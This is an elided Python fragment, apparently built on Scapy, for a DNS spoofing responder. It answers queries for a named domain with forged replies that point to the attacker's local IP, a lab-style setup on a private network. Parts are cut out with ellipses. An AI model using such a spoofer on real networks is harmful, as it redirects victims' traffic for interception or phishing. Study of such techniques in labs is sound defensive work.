...
DNS_SERVER_IP = "192.168.56.30"  # Your local IP
...
def dns_responder(local_ip: str):
    ...
    def get_response(pkt: IP):
        if (
            ...
            if "theDomainName.com" in str(pkt["DNS Question Record"].qname):
                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname="theDomainName.com",rdata=local_ip))
